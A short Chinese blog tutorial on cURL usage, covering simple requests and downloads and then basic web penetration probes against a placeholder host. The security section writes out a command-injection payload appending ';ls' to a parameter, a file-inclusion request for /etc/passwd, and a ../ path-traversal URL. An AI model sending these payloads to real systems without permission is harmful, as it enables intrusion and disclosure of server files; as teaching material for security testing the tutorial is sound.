cURL的广泛应用

发表于 2019-07-22 | 分类于 Study | 阅读次数：
本文字数： 809 | 阅读时长 ≈ 1 分钟

cURL用处挺多的

简单访问

直接访问某个网站

curl https://www.baidu.com/


利用curl下载

  • 参数-o/O
    • -o表示指定下载后文件的名称
    • -O表示下载后的文件名和服务端的文件名一样。

下载的东西会保存到当前目录下

-O 保存的只是服务端的文件名，不会将URL作为名字

如果不指定-o/O默认是直接输出信息到终端的，如果是图片文件的话，由于是二进制不支持显示，就会乱码


用curl做安全渗透

获取http头搜集服务器信息

curl -i [url]


HTTP 标头信息识别

curl -v -X OPTIONS [url]


命令注入漏洞测试

curl "http://www.xxx.com/example1.php?ip=127.0.0.1;ls"

(直接贴网上的图片了，太懒了没有进行本地复现

可以发现ls命令执行成功，返回了目录下的三个文件信息，分别是example1.php、example2.php、example3.php。


文件包含漏洞测试

curl "http://www.xxx.com/example1.php?page=/etc/passwd"

注意:curl命令以及浏览器对文件路径遍历的阻断与保护

大概是比如文件遍历的漏洞确实存在，但是关键的../被截取了,被curl和浏览器帮你做了安全过滤

http://www.xxx.com/../../../../../../../../../etc/passwd，会直接被过滤成 http://www.xxx.com/etc/passwd

（所以curl版本尤其重要
